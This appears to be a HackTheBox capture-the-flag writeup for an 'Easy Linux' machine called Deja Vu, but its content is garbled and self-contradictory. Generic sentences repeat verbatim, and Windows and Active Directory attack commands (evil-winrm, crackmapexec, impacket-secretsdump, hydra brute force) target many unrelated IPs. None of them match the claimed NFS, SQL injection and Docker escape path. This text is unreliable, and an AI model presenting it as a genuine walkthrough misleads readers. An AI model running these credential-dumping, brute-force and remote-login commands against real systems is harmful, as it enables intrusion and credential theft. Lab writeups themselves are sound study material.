---
TitleSEO: "HackTheBox — Deja Vu (Easy Linux) | ZureFX"
TitlePost: "HackTheBox — Deja Vu (Easy Linux)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Deja Vu. NFS No Root Squash and SQL Injection to achieve easy compromise on Linux."
Keywords: "offsec, forensics, hackthebox, reversing, pwntilldawn, windows"
URL: "https://zurefx.github.io/writeups/htb-deja-vu-870.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-deja-vu-870/"
Date: "2024-11-24"
Tags: "OffSec, Forensics, HackTheBox, Reversing, PwnTillDawn, Windows"
Section: "writeups"
Lang: "en"
main_img: "htb-deja-vu-870"
Permalink: "/writeups/htb-deja-vu-870.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Deja Vu** is rated **Easy** on HackTheBox. It runs **Linux** and the IP address during this analysis was `10.115.45.71`.

### Objectives

The application stored sensitive credentials in an unencrypted configuration file. Command injection was possible through unsanitized user input in the search functionality.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
crackmapexec smb 10.12.185.42 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.16.245.154 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.111.88.168 -u administrator -p 'P@ssw0rd!'
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Unconstrained delegation was enabled on the compromised machine.

### Service Enumeration

The database credentials were hardcoded in the application source code. Network traffic analysis revealed unencrypted communications containing user credentials. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.56.112.123/FUZZ
evil-winrm -i 10.113.129.252 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.81.189.235 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.11.98.236 -u administrator -p 'P@ssw0rd!' --shares
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Group Policy Preferences contained encrypted but recoverable credentials.

### SMB Enumeration

Authentication bypass was achieved through careful manipulation of the login mechanism. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.18.17.74
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.22.34.168/FUZZ
```

The kernel version was outdated and vulnerable to a publicly known exploit. Token impersonation allowed elevation to SYSTEM privileges on the target. Initial enumeration revealed several interesting open ports on the target.

## Exploitation

### Vulnerability Identification

The database credentials were hardcoded in the application source code. Authentication bypass was achieved through careful manipulation of the login mechanism. Weak file permissions allowed modification of critical system files.

Key finding: **Docker Escape**.

Weak file permissions allowed modification of critical system files. Weak file permissions allowed modification of critical system files.

### Initial Access

The web application was vulnerable to Server-Side Template Injection (SSTI). Command injection was possible through unsanitized user input in the search functionality.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.25.220.124/FUZZ
crackmapexec smb 10.76.126.213 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
```

The scheduled task ran with elevated privileges and could be abused for escalation. Network traffic analysis revealed unencrypted communications containing user credentials. Weak file permissions allowed modification of critical system files.

## Privilege Escalation

### Enumeration

Authentication bypass was achieved through careful manipulation of the login mechanism. Unconstrained delegation was enabled on the compromised machine. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
nmap -sCV -p8888,1433,636 10.108.54.21 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.48.47.137 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Exploitation

Weak file permissions allowed modification of critical system files. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p8080,3268,139 10.76.120.79 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.55.164.111
gobuster dir -u http://10.64.122.232/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The service account had excessive permissions assigned in Active Directory.

### Root/SYSTEM

Successfully obtained **root** access on the target.

The web application was vulnerable to Server-Side Template Injection (SSTI). The kernel version was outdated and vulnerable to a publicly known exploit.

## Summary

### Tools Used

- `ffuf`
- `GetUserSPNs`
- `chisel`
- `ligolo-ng`
- `kerbrute`
- `psexec`
- `msfvenom`

### Key Takeaways

- NFS No Root Squash
- SQL Injection
- Docker Escape
